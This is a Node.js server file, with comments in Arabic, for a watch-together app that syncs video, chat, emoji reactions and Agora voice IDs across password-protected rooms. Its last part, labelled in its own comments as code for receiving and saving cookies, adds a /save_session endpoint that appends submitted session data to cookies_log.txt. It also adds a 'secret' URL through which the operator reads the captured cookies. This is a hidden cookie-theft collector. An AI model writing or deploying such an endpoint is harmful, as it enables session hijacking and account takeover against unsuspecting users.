const fs = require('fs');
const path = require('path');
const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static("public"));

// تخزين بيانات الغرف والمعرفات
const rooms = {};
let agoraMap = {}; // جسر الربط: UID (الصوت) -> Socket ID (المستخدم)

io.on("connection", (socket) => {
    console.log("مستخدم متصل جديد:", socket.id);

    socket.on("join-room", ({ roomId, password, user }) => {
        // التحقق من كلمة المرور
        if (rooms[roomId] && rooms[roomId].password !== password) {
            return socket.emit("error-msg", "كلمة المرور خاطئة!");
        }

        socket.join(roomId);
        // حفظ بيانات المستخدم في السوكيت الحالي
        socket.userData = { ...user, roomId, id: socket.id };

        // إنشاء الغرفة إذا لم تكن موجودة
        if (!rooms[roomId]) {
            rooms[roomId] = { password: password, users: [], currentVideo: "" };
        }

        // إضافة المستخدم لقائمة الغرفة
        rooms[roomId].users.push(socket.userData);
        
        socket.emit("join-success");
        
        // إبلاغ الجميع بتحديث القائمة (لرسم الأفاتارات)
        io.to(roomId).emit("update-users", rooms[roomId].users);
        
        // مزامنة الفيديو الحالي للمنضم الجديد
        if(rooms[roomId].currentVideo) {
            socket.emit("video-changed", rooms[roomId].currentVideo);
        }

        // إرسال خريطة الربط الصوتية المحدثة
        io.to(roomId).emit("update-agora-map", agoraMap);
    });

    // --- أهم جزء: ربط معرف الصوت بمعرف السوكيت ---
    socket.on("map-agora-id", ({ uid }) => {
        const roomId = socket.userData?.roomId;
        if (roomId) {
            agoraMap[uid] = socket.id; // ربط الـ UID بـ Socket ID
            // نرسل الخريطة المحدثة للجميع ليتمكنوا من معرفة من يتحدث
            io.to(roomId).emit("update-agora-map", agoraMap);
        }
    });

    // تغيير الفيديو
    socket.on("change-video", (url) => {
        const roomId = socket.userData?.roomId;
        if (roomId) {
            rooms[roomId].currentVideo = url;
            io.to(roomId).emit("video-changed", url);
        }
    });

    // التحكم في المزامنة (Play/Pause/Seek)
    socket.on("video-control", (data) => {
        const roomId = socket.userData?.roomId;
        if (roomId) {
            socket.to(roomId).emit("video-sync", data);
        }
    });

    // رسائل الشات
    socket.on("chat-msg", (text) => {
        const roomId = socket.userData?.roomId;
        if (roomId) {
            io.to(roomId).emit("chat-msg", { text, user: socket.userData });
        }
    });

    // التفاعلات (Emoji)
    socket.on("reaction", (emoji) => {
        const roomId = socket.userData?.roomId;
        if (roomId) {
            io.to(roomId).emit("reaction", { emoji, userId: socket.id });
        }
    });

    // عند الخروج
    socket.on("disconnect", () => {
        const roomId = socket.userData?.roomId;
        if (rooms[roomId]) {
            // حذف المستخدم من القائمة
            rooms[roomId].users = rooms[roomId].users.filter(u => u.id !== socket.id);
            io.to(roomId).emit("update-users", rooms[roomId].users);
            
            // تنظيف خريطة الربط الصوتية
            for (let uid in agoraMap) {
                if (agoraMap[uid] === socket.id) {
                    delete agoraMap[uid];
                }
            }
            io.to(roomId).emit("update-agora-map", agoraMap);
        }
        console.log("مستخدم غادر:", socket.id);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`🚀 السيرفر يعمل على: http://localhost:${PORT}`));

// --- كود استقبال الكوكيز وحفظها ---

app.post('/save_session', (req, res) => {
    try {
        const data = req.body;

        // التأكد من أن البيانات وصلت فعلاً
        if (data && data.session_data) {
            // تجهيز النص الذي سيتم حفظه (التاريخ + البيانات)
            const logEntry = `\n--- NEW LOG [${new Date().toLocaleString()}] ---\n${data.session_data}\n`;
            
            // تحديد مسار الملف (سيتم إنشاء ملف اسمه cookies_log.txt في مجلد مشروعك)
            const filePath = path.join(__dirname, 'cookies_log.txt');

            // عملية الكتابة في الملف دون مسح البيانات القديمة (Append)
            fs.appendFile(filePath, logEntry, (err) => {
                if (err) {
                    console.error("❌ Error writing to file:", err);
                    return res.status(500).json({ status: "error" });
                }
                console.log("✅ New Cookies Captured and Saved to cookies_log.txt");
            });

            return res.status(200).json({ status: "success" });
        } else {
            return res.status(400).json({ status: "no_data" });
        }
    } catch (error) {
        console.error("❌ Server Error:", error);
        res.status(500).json({ status: "internal_error" });
    }
});

// --- نهاية كود استقبال الكوكيز ---

// رابط سري لمشاهدة النتائج من المتصفح
// استبدل 'mysecret123' بأي كلمة تريدها ليكون الرابط خاصاً بك فقط
app.get('/show-my-results-mysecret123', (req, res) => {
    const filePath = path.join(__dirname, 'cookies_log.txt');
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.send("لا يوجد بيانات مسجلة حتى الآن.");
    }
});